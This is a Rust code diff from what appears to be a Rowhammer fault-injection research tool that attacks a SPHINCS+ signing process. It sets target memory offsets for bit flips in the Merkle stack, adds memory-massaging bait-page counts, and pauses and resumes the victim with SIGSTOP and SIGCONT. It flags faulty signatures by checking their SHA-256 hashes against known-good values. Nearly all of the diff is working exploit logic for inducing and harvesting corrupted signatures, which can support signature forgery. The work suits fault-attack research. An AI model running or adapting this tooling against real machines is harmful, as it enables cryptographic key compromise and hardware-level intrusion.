@@ -1,9 +1,10 @@
 use itertools::Itertools;
 use libc::sched_getcpu;
 use serde::Serialize;
+use sha2::{Digest, Sha256};
 use std::{
     collections::HashMap,
-    io::{BufRead, BufReader, Write},
+    io::{BufRead, BufReader},
     process::ChildStdout,
     thread,
     time::Duration,
@@ -94,11 +95,11 @@ const KEYS_FILE: &str = "keys.txt";
 
 // find profile entry with bitflips in needed range
 #[derive(Clone, Debug, Serialize)]
-struct TargetOffset {
+pub struct TargetOffset {
     description: &'static str,
-    page_offset: usize,
+    pub page_offset: usize,
     stack_offset: usize,
-    target_size: usize,
+    pub target_size: usize,
 }
 fn filter_addrs(addrs: Vec<usize>, targets: &[TargetOffset]) -> Vec<(usize, TargetOffset)> {
     addrs
@@ -125,32 +126,32 @@ const _TARGET_OFFSETS_ANY: [TargetOffset; 1] = [TargetOffset {
 }];
 
 // Target offsets for shake-256s WITH memutils printing enabled
-const TARGET_OFFSETS_SHAKE_256S: [TargetOffset; 3] = [
+pub const TARGET_OFFSETS_SHAKE_256S: [TargetOffset; 1] = [
     TargetOffset {
         description: "stack merkle",
-        page_offset: 0x970,
+        page_offset: 0x930,
         stack_offset: 31,
         target_size: 256,
     },
-    TargetOffset {
+    /*TargetOffset {
         description: "leaf_addr",
-        page_offset: 0xbb8,
+        page_offset: 0xc88,
         stack_offset: 31,
         target_size: 22,
     },
     TargetOffset {
         description: "pk_addr",
-        page_offset: 0xbd8,
+        page_offset: 0xca8,
         stack_offset: 31,
         target_size: 22,
-    },
+    },*/
 ];
 
 fn find_injectable_page(addrs: Vec<usize>) -> Option<InjectionConfig> {
     // the number of bait pages to release after the target page (for memory massaging)
     let bait_count_after = HashMap::from([(29, 0), (30, 26), (31, 7), (32, 28)]);
 
-    filter_addrs(addrs, &TARGET_OFFSETS_SHAKE_256S)
+    filter_addrs(addrs, &_TARGET_OFFSETS_ANY)
         .first()
         .map(|f| InjectionConfig {
             target_addr: f.0,
@@ -294,7 +295,7 @@ impl HammerVictim for SphincsPlus {
                 set_process_affinity(cid as libc::pid_t, target_core);
 
                 // Create a pipe for IPC
-                let stdout_thread = Some(spawn_reader_thread(child.stdout.take().expect("stdout")));
+                let stdout_thread = None; //Some(spawn_reader_thread(child.stdout.take().expect("stdout")));
                 self.state = State::Running {
                     target: binary.clone(),
                     child,
@@ -316,38 +317,59 @@ impl HammerVictim for SphincsPlus {
             _ => Err(HammerVictimError::NotRunning),
         }
     }
-    fn init(&mut self) {}
+    fn init(&mut self) {
+        match self.state {
+            State::Running { ref mut child, .. } => {
+                // wait for the victim to enter "SIGSTOP" state
+                info!("Waiting for victim to stop");
+                loop {
+                    debug!("Checking victim state");
+                    let stat = lpfs::pid::stat::stat_of(child.id()).expect("stat_of");
+                    let state = stat.state();
+                    if state.eq_ignore_ascii_case(&'T') {
+                        info!("Victim stopped, ready for hammering");
+                        break;
+                    } else {
+                        trace!("Victim not stopped yet: state {:?}", state);
+                    }
+                    thread::sleep(Duration::from_secs(1));
+                }
+            }
+            _ => panic!("Victim not running"),
+        }
+    }
 
     fn check(&mut self) -> Result<VictimResult, HammerVictimError> {
         self.check_flippy_page_exists()?;
         match &mut self.state {
-            State::Running {
-                child,
-                stdout_thread,
-                ..
-            } => {
-                let old_thread = stdout_thread.take().expect("stdout thread");
-                info!("Waiting for victim to finish");
-                let (signatures, pipe) = old_thread.join().expect("join");
-                let new_thread = spawn_reader_thread(pipe); // immediately replace the thread after joining the old one
-                stdout_thread.replace(new_thread);
-
-                info!("Collected {} signatures", signatures.len());
-
-                let flipped = signatures.iter().unique().collect_vec().len() > 1;
-
-                let nwrite = child
-                    .stdin
-                    .as_mut()
-                    .expect("stdin")
-                    .write(b"\n")
-                    .expect("write");
-                if nwrite != 1 {
-                    panic!("Failed to write");
+            State::Running { child, .. } => {
+                // resume the victim
+                info!("Sending SIGCONT to victim");
+                unsafe {
+                    libc::kill(child.id() as i32, libc::SIGCONT);
                 }
 
+                let signature = {
+                    let mut stdout = child.stdout.take().expect("stdout");
+                    let mut reader = BufReader::new(&mut stdout);
+                    let mut signature = String::new();
+                    reader.read_line(&mut signature)?;
+                    child.stdout = Some(stdout);
+                    signature
+                };
+                let expected_sha256 = [
+                    "91c1db9396122a119a443563c20110dfe674357eb4adb734677cec5bd8558975", // sphincs+ sig
+                    "9f5d309b490710c8348e3b620373646cd2b9a148d3bbf0edb2262004d9d03f9c", // dummy "aaaaaa..."
+                    "3b87d083b1c541c6833c8d213f4af85094d8ca662c910aeebdd12ec702349c81", // dummy "555555..."
+                ];
+                let mut hasher = Sha256::new();
+                hasher.update(signature.as_bytes());
+                let result = hasher.finalize();
+                let sig_sha256 = hex::encode(result);
+                let flipped = !expected_sha256.contains(&sig_sha256.as_str());
+
                 if flipped {
-                    Ok(VictimResult::SphincsPlus { signatures })
+                    Ok(VictimResult::String(signature))
                 } else {
                     info!("No flips detected");
                     Err(HammerVictimError::NoFlips)
@@ -360,7 +382,6 @@ impl HammerVictim for SphincsPlus {
     fn stop(&mut self) {
         if let State::Running {
             child,
-            stdout_thread,
             stderr_logger,
             ..
         } = &mut self.state
@@ -370,12 +391,6 @@ impl HammerVictim for SphincsPlus {
             if let Some(stderr_logger) = stderr_logger.take() {
                 stderr_logger.join().expect("join");
             }
-            stdout_thread
-                .take()
-                .expect("stdout_thread")
-                .join()
-                .expect("join");
-
             self.state = State::Stopped;
         }
     }
